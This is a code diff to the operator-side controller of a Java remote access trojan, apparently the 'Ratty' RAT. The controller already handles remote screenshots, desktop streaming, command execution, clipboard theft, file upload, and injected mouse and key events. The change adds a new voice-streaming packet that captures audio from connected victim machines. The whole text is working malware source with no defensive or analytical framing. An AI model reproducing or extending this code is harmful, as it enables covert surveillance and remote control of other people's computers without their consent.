@@ -26,6 +26,7 @@ import de.sogomn.rat.packet.MouseEventPacket;
 import de.sogomn.rat.packet.PopupPacket;
 import de.sogomn.rat.packet.ScreenshotPacket;
 import de.sogomn.rat.packet.UploadFilePacket;
+import de.sogomn.rat.packet.VoicePacket;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.server.IServerObserver;
 import de.sogomn.rat.util.FrameEncoder.IFrame;
@@ -40,7 +41,6 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	private JFileChooser fileChooser;
 	
 	private ArrayList<ServerClient> clients;
-	private long nextId;
 	
 	public RattyGuiController(final RattyGui gui) {
 		this.gui = gui;
@@ -82,7 +82,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			packet = new ScreenshotPacket();
 		} else if (command == RattyGui.COMMAND) {
 			packet = CommandPacket.create();
-		} else if (command == RattyGui.DESKTOP) {
+		} else if (command == RattyGui.DESKTOP && !serverClient.isStreamingDesktop()) {
 			packet = new DesktopStreamPacket(true);
 		} else if (command == RattyGui.CLIPBOARD) {
 			packet = new ClipboardPacket();
@@ -138,20 +138,22 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			final int key = displayPanel.getLastKeyHit();
 			
 			packet = new KeyEventPacket(key, KeyEventPacket.RELEASE);
-		} else if (command == DisplayPanel.MOUSE_PRESSED) {
+		} else if (command == DisplayPanel.MOUSE_PRESSED && serverClient.isStreamingDesktop()) {
 			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
 			final int x = displayPanel.getLastXPos();
 			final int y = displayPanel.getLastYPos();
 			final int button = displayPanel.getLastButtonHit();
 			
 			packet = new MouseEventPacket(x, y, button, MouseEventPacket.PRESS);
-		} else if (command == DisplayPanel.MOUSE_RELEASED) {
+		} else if (command == DisplayPanel.MOUSE_RELEASED && serverClient.isStreamingDesktop()) {
 			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
 			final int x = displayPanel.getLastXPos();
 			final int y = displayPanel.getLastYPos();
 			final int button = displayPanel.getLastButtonHit();
 			
 			packet = new MouseEventPacket(x, y, button, MouseEventPacket.RELEASE);
+		} else if (command == RattyGui.VOICE && !serverClient.isStreamingVoice()) {
+			packet = new VoicePacket();
 		}
 		
 		return packet;
@@ -173,6 +175,14 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		displayPanel.showFrame(frame, screenWidth, screenHeight);
 		
 		serverClient.client.addPacket(request);
+	}
+	
+	private void handle(final ServerClient serverClient, final VoicePacket packet) {
+		final VoicePacket voice = new VoicePacket();
+		
+		packet.execute(serverClient.client);
+		
+		serverClient.client.addPacket(voice);
 	}
 	
 	private void handle(final ServerClient serverClient, final FileSystemPacket packet) {
@@ -207,10 +217,19 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 				handle(serverClient, screenshot);
 			} else if (packet instanceof DesktopStreamPacket) {
 				final boolean streamingDesktop = serverClient.isStreamingDesktop();
-				final DesktopStreamPacket stream = (DesktopStreamPacket)packet;
 				
 				if (streamingDesktop) {
+					final DesktopStreamPacket stream = (DesktopStreamPacket)packet;
+					
 					handle(serverClient, stream);
+				}
+			} else if (packet instanceof VoicePacket) {
+				final boolean streamingVoice = serverClient.isStreamingVoice();
+				
+				if (streamingVoice) {
+					final VoicePacket voice = (VoicePacket)packet;
+					
+					handle(serverClient, voice);
 				}
 			} else if (packet instanceof FileSystemPacket) {
 				final FileSystemPacket file = (FileSystemPacket)packet;
@@ -244,8 +263,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	
 	@Override
 	public synchronized void clientConnected(final ActiveServer server, final ActiveClient client) {
-		final long id = nextId++;
-		final ServerClient serverClient = new ServerClient(id, client);
+		final ServerClient serverClient = new ServerClient(client);
 		final InformationPacket packet = new InformationPacket();
 		
 		client.setObserver(this);
@@ -279,6 +297,11 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			treePanel.setVisible(true);
 		} else if (command == RattyGui.BUILD) {
 			StubBuilder.start();
+		} else if (command == RattyGui.VOICE) {
+			final boolean streaming = serverClient.isStreamingVoice();
+			
+			serverClient.setStreamingVoice(!streaming);
+			gui.updateTable();
 		}
 	}
 	
